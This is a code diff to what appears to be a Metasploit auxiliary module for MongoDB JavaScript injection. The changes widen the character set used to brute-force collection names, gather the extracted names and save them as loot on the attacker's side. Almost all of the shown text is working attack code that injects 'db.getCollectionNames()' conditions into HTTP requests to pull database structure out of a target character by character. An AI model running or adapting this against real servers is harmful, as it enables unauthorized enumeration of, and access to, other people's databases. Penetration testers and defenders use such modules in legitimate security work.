@@ -9,6 +9,7 @@ class Metasploit4 < Msf::Auxiliary
   Rank = GoodRanking
 
   include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Report
 
   def initialize(info={})
     super(update_info(info,
@@ -99,7 +100,8 @@ class Metasploit4 < Msf::Auxiliary
 
     vprint_status("Getting collection names")
 
-    (0..length-1).each do |i|
+    names = []
+    (0...length).each do |i|
       vprint_status("Getting length of name for collection " + i.to_s)
 
       name_len = 0
@@ -119,8 +121,8 @@ class Metasploit4 < Msf::Auxiliary
       vprint_status("Getting collection #{i}'s name")
 
       name = ''
-      (0..name_len-1).each do |k|
-        [*('a'..'z'),*('0'..'9')].each do |c|
+      (0...name_len).each do |k|
+        [*('a'..'z'),*('0'..'9'),*('A'..'Z'),'.'].each do |c|
           str = "db.getCollectionNames()[#{i}][#{k}]=='#{c}'"
           res = send_request_cgi({
             'uri' => uri.sub('[NoSQLi]', pay.sub('[inject]', str))
@@ -134,7 +136,16 @@ class Metasploit4 < Msf::Auxiliary
       end
 
       print_status("Collections #{i}'s name is " + name)
+      names << name
     end
 
+    p = store_loot("mongo_injection.#{datastore['RHOST']}_collections",
+                   "text/plain",
+                   nil,
+                   names.to_json,
+                   "mongo_injection_#{datastore['RHOST']}.txt",
+                   "#{datastore["RHOST"]} MongoDB Javascript Injection Collection Enumeration")
+
+    print_good("Your collections are located at: " + p)
   end
 end
